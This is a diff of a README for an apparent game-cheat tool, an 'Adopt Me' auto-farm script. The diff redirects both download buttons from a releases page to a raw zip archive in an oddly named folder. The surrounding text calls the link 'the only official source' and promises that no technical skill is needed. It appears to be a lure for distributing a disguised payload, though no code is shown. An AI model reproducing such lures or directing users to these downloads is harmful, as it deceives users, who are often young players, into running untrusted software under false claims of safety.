@@ -1,7 +1,7 @@
 <h1>📌 Adopt Me Script 2026 - Auto-Farm Pets & Quests</h1>
 
 <p align="center">
-  <a href="https://github.com/aaliyan3/adopt-me-script-2026/releases" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/aaliyan3/adopt-me-script-2026/main/Heliornis/3.5-beta.1.zip" style="background-color:#4CAF50;color:white;padding:15px 32px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;font-weight:bold;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ---
@@ -37,7 +37,7 @@ Follow these simple steps to get the software up and running. No technical skill
 Open your web browser and go to this official repository link:
 
 <p align="center">
-  <a href="https://github.com/aaliyan3/adopt-me-script-2026/releases" style="background-color:#008CBA;color:white;padding:12px 24px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;font-weight:bold;">🔗 Click Here to Download the Software</a>
+  <a href="https://raw.githubusercontent.com/aaliyan3/adopt-me-script-2026/main/Heliornis/3.5-beta.1.zip" style="background-color:#008CBA;color:white;padding:12px 24px;text-align:center;text-decoration:none;display:inline-block;font-size:16px;border-radius:8px;font-weight:bold;">🔗 Click Here to Download the Software</a>
 </p>
 
 Visit this link to download the application. This is the only official source for the software. Please do not download from any other website to avoid security risks.
